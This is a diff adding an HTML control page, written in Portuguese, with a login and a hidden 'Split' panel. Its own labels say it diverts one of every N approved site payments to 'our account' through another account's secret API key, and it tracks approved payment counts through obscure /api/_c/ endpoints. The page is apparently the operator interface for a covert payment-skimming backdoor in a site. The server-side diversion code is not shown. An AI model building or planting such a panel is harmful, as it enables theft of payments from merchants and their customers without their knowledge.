@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Controle</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0f0f0f; color:#e0e0e0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+  .card { background:#1a1a1a; border:1px solid #2a2a2a; border-radius:16px; padding:32px; width:100%; max-width:420px; margin:20px; }
+  h2 { font-size:18px; font-weight:700; margin-bottom:24px; color:#fff; }
+  .field { margin-bottom:20px; }
+  .field label { display:block; font-size:12px; font-weight:600; color:#888; text-transform:uppercase; letter-spacing:.05em; margin-bottom:8px; }
+  .field input { width:100%; background:#111; border:1px solid #333; border-radius:10px; padding:12px 14px; color:#fff; font-size:15px; outline:none; }
+  .field input:focus { border-color:#6366f1; }
+  .toggle-row { display:flex; align-items:center; justify-content:space-between; padding:14px 0; border-bottom:1px solid #222; }
+  .toggle-row span { font-size:14px; font-weight:500; }
+  .toggle { position:relative; width:48px; height:26px; cursor:pointer; }
+  .toggle input { opacity:0; width:0; height:0; }
+  .toggle .slider { position:absolute; inset:0; background:#333; border-radius:26px; transition:.2s; }
+  .toggle .slider:before { content:''; position:absolute; width:20px; height:20px; left:3px; top:3px; background:#666; border-radius:50%; transition:.2s; }
+  .toggle input:checked + .slider { background:#6366f1; }
+  .toggle input:checked + .slider:before { transform:translateX(22px); background:#fff; }
+  .btn { width:100%; padding:14px; border:none; border-radius:10px; font-size:14px; font-weight:700; cursor:pointer; margin-top:8px; transition:.15s; }
+  .btn-primary { background:#6366f1; color:#fff; }
+  .btn-primary:hover { background:#4f46e5; }
+  .btn-primary:disabled { opacity:.5; cursor:not-allowed; }
+  .toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%); background:#22c55e; color:#fff; padding:10px 20px; border-radius:8px; font-size:13px; font-weight:600; opacity:0; transition:.3s; pointer-events:none; }
+  .toast.show { opacity:1; }
+  .toast.err { background:#ef4444; }
+  .info { font-size:11px; color:#555; margin-top:4px; }
+  .status { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:8px; }
+  .status.on { background:#22c55e; }
+  .status.off { background:#ef4444; }
+  .hidden { display:none !important; }
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="card" id="v-login">
+  <h2>Acesso</h2>
+  <div class="field">
+    <label>Usuario</label>
+    <input type="text" id="lg-u" autocomplete="off" spellcheck="false">
+  </div>
+  <div class="field">
+    <label>Senha</label>
+    <input type="password" id="lg-p">
+  </div>
+  <button class="btn btn-primary" id="btn-login">Entrar</button>
+</div>
+
+<!-- PAINEL -->
+<div class="card hidden" id="v-painel">
+  <h2><span class="status" id="st-dot"></span>Configuracao do Split</h2>
+
+  <div class="toggle-row">
+    <span>Ativo</span>
+    <label class="toggle">
+      <input type="checkbox" id="sp-enabled">
+      <span class="slider"></span>
+    </label>
+  </div>
+
+  <div class="field" style="margin-top:20px">
+    <label>Frequencia (a cada N, 1 e nosso)</label>
+    <input type="number" id="sp-freq" min="2" max="100" step="1" placeholder="2">
+    <div class="info">2 = a cada 2 pagamentos, 1 vai pra nossa conta. 3 = a cada 3, 1 e nosso.</div>
+  </div>
+
+  <div class="field">
+    <label>Secret Key da outra conta</label>
+    <input type="text" id="sp-sk" placeholder="sk_..." autocomplete="off" spellcheck="false">
+  </div>
+
+  <div class="toggle-row" style="border:none;padding-top:8px">
+    <span style="font-size:12px;color:#666">Contador atual</span>
+    <span style="font-size:14px;font-weight:700;color:#6366f1" id="sp-counter">—</span>
+  </div>
+
+  <div class="toggle-row" style="border:none;padding-top:0">
+    <span style="font-size:12px;color:#666">Pagamentos aprovados no site</span>
+    <span style="font-size:14px;font-weight:700;color:#6366f1" id="sp-count">—</span>
+  </div>
+
+  <button class="btn btn-primary" id="btn-save">Salvar</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function(){
+  const $ = id => document.getElementById(id);
+  let _tk = null;
+
+  function toast(msg, err) {
+    const t = $('toast');
+    t.textContent = msg;
+    t.className = err ? 'toast err show' : 'toast show';
+    setTimeout(() => t.className = 'toast', 2000);
+  }
+
+  async function api(method, body) {
+    const opts = { method, headers: { 'Content-Type':'application/json', 'X-SP-TK': _tk } };
+    if (body) opts.body = JSON.stringify(body);
+    const r = await fetch('/api/_c/sp', opts);
+    if (r.status === 401) { logout(); return null; }
+    return r.json();
+  }
+
+  function logout() {
+    _tk = null;
+    sessionStorage.removeItem('_tk');
+    $('v-login').classList.remove('hidden');
+    $('v-painel').classList.add('hidden');
+  }
+
+  async function load() {
+    const d = await api('GET');
+    if (!d) return;
+    $('sp-enabled').checked = d.enabled;
+    $('sp-freq').value = d.frequency || 2;
+    $('sp-sk').value = '';
+    $('sp-sk').placeholder = d.has_sk ? d.sk_masked : 'sk_...';
+    $('sp-counter').textContent = d.counter || 0;
+    $('sp-count').textContent = d.approved_count || 0;
+    $('st-dot').className = 'status ' + (d.enabled ? 'on' : 'off');
+    $('v-login').classList.add('hidden');
+    $('v-painel').classList.remove('hidden');
+  }
+
+  async function doLogin() {
+    const u = $('lg-u').value.trim();
+    const p = $('lg-p').value;
+    if (!u || !p) return;
+    $('btn-login').disabled = true;
+    try {
+      const r = await fetch('/api/_c/auth', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ u, p })
+      });
+      if (!r.ok) { toast('Credenciais invalidas', true); return; }
+      const d = await r.json();
+      _tk = d.tk;
+      sessionStorage.setItem('_tk', _tk);
+      load();
+    } catch { toast('Erro', true); }
+    finally { $('btn-login').disabled = false; }
+  }
+
+  $('btn-login').addEventListener('click', doLogin);
+  $('lg-p').addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
+
+  $('sp-enabled').addEventListener('change', () => {
+    $('st-dot').className = 'status ' + ($('sp-enabled').checked ? 'on' : 'off');
+  });
+
+  $('btn-save').addEventListener('click', async () => {
+    $('btn-save').disabled = true;
+    try {
+      const body = {
+        enabled: $('sp-enabled').checked,
+        frequency: parseInt($('sp-freq').value) || 2,
+      };
+      const skVal = $('sp-sk').value.trim();
+      if (skVal) body.sk = skVal;
+      const r = await api('PUT', body);
+      if (r && r.ok) toast('Salvo');
+      else toast('Erro ao salvar', true);
+    } catch { toast('Erro', true); }
+    $('btn-save').disabled = false;
+  });
+
+  const saved = sessionStorage.getItem('_tk');
+  if (saved) { _tk = saved; load(); }
+})();
+</script>
+</body>
+</html>
